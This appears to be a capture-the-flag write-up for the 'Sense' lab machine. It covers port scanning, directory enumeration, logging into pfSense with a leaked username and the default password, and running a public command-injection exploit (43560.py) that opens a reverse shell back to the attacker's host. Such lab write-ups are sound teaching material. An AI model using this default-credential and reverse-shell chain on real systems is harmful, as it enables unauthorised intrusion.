# Sense

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.85.96 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 07:48 EDT
Nmap scan report for 10.129.85.96
Host is up (0.0088s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https
```

2 ports that are open.

### pfSense Creds + RCE

Visiting the IP address redirects us to port 443 where pfSense is running:

<figure><img src="../../../.gitbook/assets/image (3534).png" alt=""><figcaption></figcaption></figure>

We can run a `dirbuster` scan to see what else is on the port because we have no credentials right now. We can include all the common extensions using `-e php,html,txt` to see all possible files on the machine.

```bash
$ dirbuster -u https://10.129.85.96/ -t 20 -l /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e php,txt,html
<TRUNCATED>
File found: /edit.php - 200
File found: /license.php - 200
File found: /system.php - 200
File found: /status.php - 200
File found: /changelog.txt - 200
File found: /exec.php - 200
File found: /graph.php - 200
Dir found: /tree/ - 200
File found: /tree/index.html - 200
File found: /tree/tree.js - 200
File found: /wizard.php - 200
File found: /pkg.php - 200
Dir found: /installer/ - 302
File found: /installer/index.php - 302
File found: /installer/installer.php - 200
File found: /xmlrpc.php - 200
File found: /reboot.php - 200
File found: /interfaces.php - 200
FIle Found: /system-users.txt - 200
```

One of them is called `system-users.txt`. The file contains this:

```
####Support ticket###

Please create the following user


username: Rohit
password: company defaults
```

So the username is Rohit and the password is the default password. In this case, the default password for this software is `pfsense`. We can then login and see the version running:

<figure><img src="../../../.gitbook/assets/image (187).png" alt=""><figcaption></figcaption></figure>

This is an outdated version of pfSense running, and it is vulnerable to an RCE exploit.

```
$ searchsploit pfsense 2.1.3
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injec | php/webapps/43560.py
----------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

We can download this exploit and use it to get a reverse shell.

```bash
python3 43560.py --rhost 10.129.85.96 --lhost 10.10.14.13 --lport 4444 --username rohit --password pfsense
```

<figure><img src="../../../.gitbook/assets/image (169).png" alt=""><figcaption></figcaption></figure>

Rooted!&#x20;
